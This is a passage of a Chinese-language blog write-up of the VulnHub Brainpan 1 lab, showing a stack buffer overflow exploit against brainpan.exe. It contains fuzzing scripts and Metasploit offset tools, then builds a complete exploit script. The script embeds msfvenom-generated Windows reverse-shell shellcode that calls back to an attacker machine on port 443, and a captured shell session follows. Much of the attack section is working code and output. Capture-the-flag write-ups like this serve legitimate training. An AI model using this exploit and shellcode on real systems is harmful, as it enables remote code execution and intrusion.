shitstorm</span><br><span class="line">                          ACCESS GRANTED</span><br></pre></td></tr></table></figure>

<p>返回。<br>嗯…如何检查strcpy函数。<br>虽然有适用于Linux的Evan的Debugger和Immunity Debugger（通过wine执行），但我选择在Windows环境中将Immunity Debugger用于“windozy”类型的任务。</p>
<p>免责声明：对于那些已经知道如何执行简单的strcpy缓冲区溢出的人，可以快速进入下一节，因为这本身就很冗长且“用户友好”。选择为每个步骤包括大量的模糊测试代码和详细信息，以便对这种攻击媒介不熟悉的任何人都可以轻松学习并希望了解该过程。</p>
<p>是时候使用快速模糊器来看看是否可以获取导致段错误的输入。这是经常使用的一些代码，并在进行过程中使用shellcode和register进行修改。简单，有效。</p>
<p>etfuzz.py</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">import sys,socket</span><br><span class="line"> </span><br><span class="line">victim = <span class="string">&#x27;192.168.56.115&#x27;</span></span><br><span class="line">port = 9999</span><br><span class="line"> </span><br><span class="line">junk = <span class="string">&quot;\x41&quot;</span> * 1000</span><br><span class="line"> </span><br><span class="line">payload = junk </span><br><span class="line"> </span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"> </span><br><span class="line">try:</span><br><span class="line">  <span class="built_in">print</span> <span class="string">&quot;[-] Connecting to &quot;</span> + str(victim)</span><br><span class="line">  s.connect((victim, port))</span><br><span class="line">  s.recv(1024)</span><br><span class="line"> </span><br><span class="line">  <span class="comment"># Send payload </span></span><br><span class="line">  <span class="built_in">print</span> <span class="string">&quot;[-] Sending payload.... &quot;</span>,</span><br><span class="line">  s.send(payload)</span><br><span class="line">  <span class="built_in">print</span> <span class="string">&quot;Done&quot;</span></span><br><span class="line"> </span><br><span class="line">except:</span><br><span class="line">  <span class="built_in">print</span> <span class="string">&quot;[-] Unable to connect to &quot;</span> + str(victim)</span><br><span class="line">  sys.exit(0)</span><br></pre></td></tr></table></figure>

<p>是时候运行brainpan.exe并使用Immunity Debugger附加到进程。在Windows机器上侦听该进程的情况下，在端口9999上放置1000个模糊测试（\x41），看看是否遇到段错误。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">C:\Users\HASEE\Desktop\brainpan1&gt;python etfuzz.py</span><br><span class="line">[-] Connecting to 192.168.43.98</span><br><span class="line">[-] Sending payload....  Done</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">C:\Users\HASEE\Desktop\brainpan1&gt;brainpan.exe</span><br><span class="line">[+] initializing winsock...done.</span><br><span class="line">[+] server socket created.</span><br><span class="line">[+] <span class="built_in">bind</span> <span class="keyword">done</span> on port 9999</span><br><span class="line">[+] waiting <span class="keyword">for</span> connections.</span><br><span class="line">[+] received connection.</span><br><span class="line">[get_reply] s = [AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA(_]</span><br><span class="line">[get_reply] copied 1003 bytes to buffer</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub193.jpg"></p>
<p>AM！造成了我们想要的段错误，所见，已经成功地使用模糊A覆盖了eip。是时候控制自己，享受一些乐趣了。<br>下一步，需要多少字节来填充缓冲区以使eip？使用Metasploit的工具进行此活动。创建一个模式作为开始。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/vulnhub/brainpan1<span class="comment"># /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1000</span></span><br><span class="line">Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B</span><br></pre></td></tr></table></figure>

<p>将其添加到模糊测试脚本etfuzz.py中，用模式输出替换掉A的垃圾数据。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">import sys,socket</span><br><span class="line"> </span><br><span class="line">victim = <span class="string">&#x27;192.168.43.98&#x27;</span></span><br><span class="line">port = 9999</span><br><span class="line"> </span><br><span class="line">junk = <span class="string">&quot;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B&quot;</span></span><br><span class="line"> </span><br><span class="line">payload = junk </span><br><span class="line"> </span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"> </span><br><span class="line">try:</span><br><span class="line">  <span class="built_in">print</span> <span class="string">&quot;[-] Connecting to &quot;</span> + str(victim)</span><br><span class="line">  s.connect((victim, port))</span><br><span class="line">  s.recv(1024)</span><br><span class="line"> </span><br><span class="line">  <span class="comment"># Send payload </span></span><br><span class="line">  <span class="built_in">print</span> <span class="string">&quot;[-] Sending payload.... &quot;</span>,</span><br><span class="line">  s.send(payload)</span><br><span class="line">  <span class="built_in">print</span> <span class="string">&quot;Done&quot;</span></span><br><span class="line"> </span><br><span class="line">except:</span><br><span class="line">  <span class="built_in">print</span> <span class="string">&quot;[-] Unable to connect to &quot;</span> + str(victim)</span><br><span class="line">  sys.exit(0)</span><br></pre></td></tr></table></figure>

<p>下一步。重新启动brainpan.exe进程，重新附加到进程，然后将模糊测试脚本发送给侦听器。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">C:\Users\HASEE\Desktop\brainpan1&gt;python etfuzz.py</span><br><span class="line">[-] Connecting to 192.168.43.98</span><br><span class="line">[-] Sending payload....  Done</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">C:\Users\HASEE\Desktop\brainpan1&gt;brainpan.exe</span><br><span class="line">[+] initializing winsock...done.</span><br><span class="line">[+] server socket created.</span><br><span class="line">[+] <span class="built_in">bind</span> <span class="keyword">done</span> on port 9999</span><br><span class="line">[+] waiting <span class="keyword">for</span> connections.</span><br><span class="line">[+] received connection.</span><br><span class="line">[get_reply] s = [Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B(_]</span><br><span class="line">[get_reply] copied 1003 bytes to buffer</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub194.jpg"></p>
<p>再次成功地覆盖了eip。记下指令指针地址35724134，将其推入Metasploit的模式偏移工具中，这将提供为控制eip而需要发送到缓冲区的字节数。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/vulnhub/brainpan1<span class="comment"># /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 35724134</span></span><br><span class="line">[*] Exact match at offset 524</span><br></pre></td></tr></table></figure>

<p>知道只需要524字节的“垃圾数据”就可以成为eip。相应地编辑模糊测试器，看看是否可以用某些B（\x42）成功覆盖eip。重新运行，重新连接并启动模糊测试器。</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub195.jpg"></p>
<p>瞧！如所见，已成功用4个字节的B覆盖了eip。下一个是什么？接下来，看看是否可以将自己的代码放入esp中。如果可以将代码放入esp，将查找名为jmp esp的函数调用，告诉eip指向esp，从而能够执行存储在esp中的恶意代码。编辑模糊器，使其在esp中包含一堆C（\x43），并查看是否有足够的空间容纳潜在的Shellcode。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">import sys,socket</span><br><span class="line"> </span><br><span class="line">victim = <span class="string">&#x27;192.168.43.98&#x27;</span></span><br><span class="line">port = 9999</span><br><span class="line"> </span><br><span class="line">junk = <span class="string">&quot;\x41&quot;</span> * 524</span><br><span class="line">eip = <span class="string">&quot;\x42&quot;</span> * 4</span><br><span class="line">shellcode = <span class="string">&quot;\x43&quot;</span> * 500</span><br><span class="line"> </span><br><span class="line">payload = junk + eip + shellcode</span><br><span class="line"> </span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"> </span><br><span class="line">try:</span><br><span class="line">  <span class="built_in">print</span> <span class="string">&quot;[-] Connecting to &quot;</span> + str(victim)</span><br><span class="line">  s.connect((victim, port))</span><br><span class="line">  s.recv(1024)</span><br><span class="line"> </span><br><span class="line">  <span class="comment"># Send payload </span></span><br><span class="line">  <span class="built_in">print</span> <span class="string">&quot;[-] Sending payload.... &quot;</span>,</span><br><span class="line">  s.send(payload)</span><br><span class="line">  <span class="built_in">print</span> <span class="string">&quot;Done&quot;</span></span><br><span class="line"> </span><br><span class="line">except:</span><br><span class="line">  <span class="built_in">print</span> <span class="string">&quot;[-] Unable to connect to &quot;</span> + str(victim)</span><br><span class="line">  sys.exit(0)</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub196.jpg"></p>
<p>正如上面看到的，已经成功地用大量C填充了esp，这使知道有一些可用于放置shellcode的区域。让看看是否可以找到jmp esp函数的地址。在Immunity Debugger中，使用ctrl-f并输入搜索jmp esp。如所见，第一个jmp esp地址是311712F3。</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub197.jpg"></p>
<p>下一步，生成一些shellcode，以测试概念验证（PoC）是否有效。由于要测试的PoC框是一个windoZe机器，因此将使用msfvenom生成一个简单的Windows reverse shell。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># msfvenom -p windows/shell_reverse_tcp LHOST=192.168.56.102 LPORT=443 R -e x86/shikata_ga_nai -b &#x27;\x00&#x27; -f python</span></span><br><span class="line">[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload</span><br><span class="line">[-] No arch selected, selecting arch: x86 from the payload</span><br><span class="line">Found 1 compatible encoders</span><br><span class="line">Attempting to encode payload with 1 iterations of x86/shikata_ga_nai</span><br><span class="line">x86/shikata_ga_nai succeeded with size 351 (iteration=0)</span><br><span class="line">x86/shikata_ga_nai chosen with final size 351</span><br><span class="line">Payload size: 351 bytes</span><br><span class="line">Final size of python file: 1712 bytes</span><br><span class="line">buf =  b<span class="string">&quot;&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\xba\x3a\x75\x8a\xdd\xd9\xed\xd9\x74\x24\xf4\x5b\x31&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\xc9\xb1\x52\x31\x53\x12\x03\x53\x12\x83\xd1\x89\x68&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x28\xd9\x9a\xef\xd3\x21\x5b\x90\x5a\xc4\x6a\x90\x39&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x8d\xdd\x20\x49\xc3\xd1\xcb\x1f\xf7\x62\xb9\xb7\xf8&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\xc3\x74\xee\x37\xd3\x25\xd2\x56\x57\x34\x07\xb8\x66&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\xf7\x5a\xb9\xaf\xea\x97\xeb\x78\x60\x05\x1b\x0c\x3c&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x96\x90\x5e\xd0\x9e\x45\x16\xd3\x8f\xd8\x2c\x8a\x0f&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\xdb\xe1\xa6\x19\xc3\xe6\x83\xd0\x78\xdc\x78\xe3\xa8&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x2c\x80\x48\x95\x80\x73\x90\xd2\x27\x6c\xe7\x2a\x54&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x11\xf0\xe9\x26\xcd\x75\xe9\x81\x86\x2e\xd5\x30\x4a&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\xa8\x9e\x3f\x27\xbe\xf8\x23\xb6\x13\x73\x5f\x33\x92&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x53\xe9\x07\xb1\x77\xb1\xdc\xd8\x2e\x1f\xb2\xe5\x30&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\xc0\x6b\x40\x3b\xed\x78\xf9\x66\x7a\x4c\x30\x98\x7a&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\xda\x43\xeb\x48\x45\xf8\x63\xe1\x0e\x26\x74\x06\x25&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x9e\xea\xf9\xc6\xdf\x23\x3e\x92\x8f\x5b\x97\x9b\x5b&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x9b\x18\x4e\xcb\xcb\xb6\x21\xac\xbb\x76\x92\x44\xd1&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x78\xcd\x75\xda\x52\x66\x1f\x21\x35\x49\x48\x11\xa3&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x21\x8b\x61\x2a\x09\x02\x87\x46\x7d\x43\x10\xff\xe4&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\xce\xea\x9e\xe9\xc4\x97\xa1\x62\xeb\x68\x6f\x83\x86&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x7a\x18\x63\xdd\x20\x8f\x7c\xcb\x4c\x53\xee\x90\x8c&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x1a\x13\x0f\xdb\x4b\xe5\x46\x89\x61\x5c\xf1\xaf\x7b&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x38\x3a\x6b\xa0\xf9\xc5\x72\x25\x45\xe2\x64\xf3\x46&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\xae\xd0\xab\x10\x78\x8e\x0d\xcb\xca\x78\xc4\xa0\x84&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\xec\x91\x8a\x16\x6a\x9e\xc6\xe0\x92\x2f\xbf\xb4\xad&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x80\x57\x31\xd6\xfc\xc7\xbe\x0d\x45\xf7\xf4\x0f\xec&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x90\x50\xda\xac\xfc\x62\x31\xf2\xf8\xe0\xb3\x8b\xfe&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\xf9\xb6\x8e\xbb\xbd\x2b\xe3\xd4\x2b\x4b\x50\xd4\x79&quot;</span></span><br></pre></td></tr></table></figure>

<p>接下来，让把它们放在一起,payload将如下所示：{junk} {jmp esp地址} {nops + buf}</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">import sys,socket</span><br><span class="line"> </span><br><span class="line">victim = <span class="string">&#x27;192.168.43.98&#x27;</span></span><br><span class="line">port = 9999</span><br><span class="line"> </span><br><span class="line">junk = <span class="string">&quot;\x41&quot;</span> * 524</span><br><span class="line">eip = <span class="string">&quot;\xf3\x12\x17\x31&quot;</span></span><br><span class="line">buf =  b<span class="string">&quot;\x90&quot;</span> * 13</span><br><span class="line">buf += b<span class="string">&quot;\xba\x3a\x75\x8a\xdd\xd9\xed\xd9\x74\x24\xf4\x5b\x31&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\xc9\xb1\x52\x31\x53\x12\x03\x53\x12\x83\xd1\x89\x68&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x28\xd9\x9a\xef\xd3\x21\x5b\x90\x5a\xc4\x6a\x90\x39&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x8d\xdd\x20\x49\xc3\xd1\xcb\x1f\xf7\x62\xb9\xb7\xf8&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\xc3\x74\xee\x37\xd3\x25\xd2\x56\x57\x34\x07\xb8\x66&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\xf7\x5a\xb9\xaf\xea\x97\xeb\x78\x60\x05\x1b\x0c\x3c&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x96\x90\x5e\xd0\x9e\x45\x16\xd3\x8f\xd8\x2c\x8a\x0f&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\xdb\xe1\xa6\x19\xc3\xe6\x83\xd0\x78\xdc\x78\xe3\xa8&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x2c\x80\x48\x95\x80\x73\x90\xd2\x27\x6c\xe7\x2a\x54&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x11\xf0\xe9\x26\xcd\x75\xe9\x81\x86\x2e\xd5\x30\x4a&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\xa8\x9e\x3f\x27\xbe\xf8\x23\xb6\x13\x73\x5f\x33\x92&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x53\xe9\x07\xb1\x77\xb1\xdc\xd8\x2e\x1f\xb2\xe5\x30&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\xc0\x6b\x40\x3b\xed\x78\xf9\x66\x7a\x4c\x30\x98\x7a&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\xda\x43\xeb\x48\x45\xf8\x63\xe1\x0e\x26\x74\x06\x25&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x9e\xea\xf9\xc6\xdf\x23\x3e\x92\x8f\x5b\x97\x9b\x5b&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x9b\x18\x4e\xcb\xcb\xb6\x21\xac\xbb\x76\x92\x44\xd1&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x78\xcd\x75\xda\x52\x66\x1f\x21\x35\x49\x48\x11\xa3&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x21\x8b\x61\x2a\x09\x02\x87\x46\x7d\x43\x10\xff\xe4&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\xce\xea\x9e\xe9\xc4\x97\xa1\x62\xeb\x68\x6f\x83\x86&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x7a\x18\x63\xdd\x20\x8f\x7c\xcb\x4c\x53\xee\x90\x8c&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x1a\x13\x0f\xdb\x4b\xe5\x46\x89\x61\x5c\xf1\xaf\x7b&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x38\x3a\x6b\xa0\xf9\xc5\x72\x25\x45\xe2\x64\xf3\x46&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\xae\xd0\xab\x10\x78\x8e\x0d\xcb\xca\x78\xc4\xa0\x84&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\xec\x91\x8a\x16\x6a\x9e\xc6\xe0\x92\x2f\xbf\xb4\xad&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x80\x57\x31\xd6\xfc\xc7\xbe\x0d\x45\xf7\xf4\x0f\xec&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x90\x50\xda\xac\xfc\x62\x31\xf2\xf8\xe0\xb3\x8b\xfe&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\xf9\xb6\x8e\xbb\xbd\x2b\xe3\xd4\x2b\x4b\x50\xd4\x79&quot;</span></span><br><span class="line"> </span><br><span class="line">payload = junk + eip + buf</span><br><span class="line"> </span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"> </span><br><span class="line">try:</span><br><span class="line">  <span class="built_in">print</span> <span class="string">&quot;[-] Connecting to &quot;</span> + str(victim)</span><br><span class="line">  s.connect((victim, port))</span><br><span class="line">  s.recv(1024)</span><br><span class="line"> </span><br><span class="line">  <span class="comment"># Send payload </span></span><br><span class="line">  <span class="built_in">print</span> <span class="string">&quot;[-] Sending payload.... &quot;</span>,</span><br><span class="line">  s.send(payload)</span><br><span class="line">  <span class="built_in">print</span> <span class="string">&quot;Done&quot;</span></span><br><span class="line"> </span><br><span class="line">except:</span><br><span class="line">  <span class="built_in">print</span> <span class="string">&quot;[-] Unable to connect to &quot;</span> + str(victim)</span><br><span class="line">  sys.exit(0)</span><br></pre></td></tr></table></figure>

<p>启动brainpan.exe程序，在端口443上创建netcat侦听器，然后测试一下PoC代码。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">C:\Users\HASEE\Desktop\brainpan1&gt;python etfuzz.py</span><br><span class="line">[-] Connecting to 192.168.43.98</span><br><span class="line">[-] Sending payload....  Done</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nc -lvp 443</span></span><br><span class="line">listening on [any] 443 ...</span><br><span class="line">192.168.56.1: inverse host lookup failed: Host name lookup failure</span><br><span class="line">connect to [192.168.56.102] from (UNKNOWN) [192.168.56.1] 18602</span><br><span class="line">Microsoft Windows [�汾 10.0.18363.592]</span><br><span class="line">(c) 2019 Microsoft Corporation����������Ȩ����</span><br><span class="line"></span><br><span class="line">C:\Users\HASEE\Desktop\brainpan1&gt;chcp 65001</span><br><span class="line">chcp 65001</span><br><span class="line">Active code page: 65001</span><br><span class="line"></span><br><span class="line">C:\Users\HASEE\Desktop\brainpan1&gt;whoami  </span><br><span class="line">whoami</span><br><span class="line">iz94tylsq69z\hasee</span><br><span class="line"></span><br><span class="line">C:\Users\HASEE\Desktop\brainpan1&gt;dir</span><br><span class="line">dir</span><br><span class="line"> Volume <span class="keyword">in</span> drive C has no label.</span><br><span class="line"> Volume Serial Number is 7A49-F084</span><br><span class="line"></span><br><span 